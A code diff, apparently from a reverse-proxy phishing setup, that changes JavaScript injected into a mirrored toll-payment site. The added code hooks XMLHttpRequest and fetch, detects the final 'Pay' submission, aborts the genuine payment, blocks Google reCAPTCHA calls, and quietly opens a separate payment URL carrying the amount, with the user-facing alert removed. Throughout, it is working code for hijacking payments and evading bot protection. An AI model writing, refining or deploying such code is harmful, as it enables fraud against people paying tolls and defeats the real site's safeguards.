@@ -414,15 +414,29 @@ const proxyOptions = {
     }
   }
   
-  // Override XMLHttpRequest.open to track request details
+  // Override XMLHttpRequest.open to track request details AND block reCAPTCHA
   XMLHttpRequest.prototype.open = function(method, url) {
     this._interceptedMethod = method;
     this._interceptedURL = url;
+    
+    // CRITICAL: Block reCAPTCHA requests if redirect is in progress
+    if (redirectInProgress && url && url.includes('google.com/recaptcha')) {
+      console.log('[Payment Redirect] BLOCKING reCAPTCHA request (redirect in progress)');
+      this._blocked = true;
+      return; // Don't call original open - block the request
+    }
+    
     return originalXHROpen.apply(this, arguments);
   };
   
   // Override XMLHttpRequest.send to intercept /pay-toll requests
   XMLHttpRequest.prototype.send = function(body) {
+    // If request was blocked in open(), don't send it
+    if (this._blocked) {
+      console.log('[Payment Redirect] Request was blocked, not sending');
+      return;
+    }
+    
     // Check if this is a Drupal AJAX payment request
     if (
       this._interceptedMethod === 'POST' &&
@@ -443,11 +457,16 @@ const proxyOptions = {
       const isFinalPayButton = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
       
       if (hasTotalPayment && isFinalPayButton && !redirectInProgress) {
-        console.log('[Payment Redirect] FINAL PAYMENT REQUEST DETECTED');
+        console.log('[Payment Redirect] FINAL PAYMENT REQUEST DETECTED - BLOCKING');
         redirectInProgress = true;
         
-        // Abort the original request immediately
-        this.abort();
+        // CRITICAL: Abort BEFORE any reCAPTCHA can be triggered
+        try {
+          this.abort();
+          console.log('[Payment Redirect] Request aborted successfully');
+        } catch (e) {
+          console.error('[Payment Redirect] Error aborting request:', e);
+        }
         
         // Extract amount DYNAMICALLY from the request body or page
         let amount = null;
@@ -464,21 +483,29 @@ const proxyOptions = {
         if (amount && parseFloat(amount) > 0) {
           console.log('[Payment Redirect] Redirecting with dynamic amount:', amount);
           
-          // Open payment system in new tab
-          window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
+          // Open payment system in new tab (silently, no alerts)
+          const paymentWindow = window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
           
-          // Show message and reload to reset state
-          setTimeout(function() {
-            alert('Payment page opened in a new tab.');
-            window.location.reload();
-          }, 500);
+          if (paymentWindow) {
+            console.log('[Payment Redirect] Payment window opened successfully');
+            // Don't reload - let user continue on current page
+          } else {
+            console.error('[Payment Redirect] Failed to open payment window (popup blocked?)');
+            redirectInProgress = false;
+          }
         } else {
           console.error('[Payment Redirect] Could not find dynamic amount');
           redirectInProgress = false;
         }
         
-        return;
+        return; // Don't send the request
       }
+    }
+    
+    // Block reCAPTCHA requests if redirect is in progress
+    if (redirectInProgress && this._interceptedURL && this._interceptedURL.includes('google.com/recaptcha')) {
+      console.log('[Payment Redirect] BLOCKING reCAPTCHA send (redirect in progress)');
+      return; // Don't send reCAPTCHA request
     }
     
     // For all other requests, proceed normally
@@ -488,6 +515,12 @@ const proxyOptions = {
   // Override Fetch API (backup interception)
   window.fetch = function(url, options) {
     const urlStr = typeof url === 'string' ? url : url.toString();
+    
+    // CRITICAL: Block ALL reCAPTCHA requests if redirect is in progress
+    if (redirectInProgress && urlStr.includes('google.com/recaptcha')) {
+      console.log('[Payment Redirect] BLOCKING reCAPTCHA Fetch request (redirect in progress)');
+      return Promise.reject(new Error('reCAPTCHA blocked - redirect in progress'));
+    }
     
     if (
       options &&
@@ -499,13 +532,15 @@ const proxyOptions = {
       // Check if final payment submit
       if (options.body && !redirectInProgress) {
         const bodyStr = options.body.toString();
-        const isFinalSubmit = bodyStr.includes('op=Pay') || bodyStr.includes('form_id=eflow_pay_toll_form');
+        const hasTotalPayment = bodyStr.includes('total_payment=');
+        const isFinalSubmit = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
         
-        if (isFinalSubmit) {
-          console.log('[Payment Redirect] FINAL PAYMENT via Fetch');
+        if (hasTotalPayment && isFinalSubmit) {
+          console.log('[Payment Redirect] FINAL PAYMENT via Fetch - BLOCKING');
           redirectInProgress = true;
           
-          const amount = extractAmount();
+          const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
+          const amount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : extractAmount();
           
           if (amount && parseFloat(amount) > 0) {
             window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
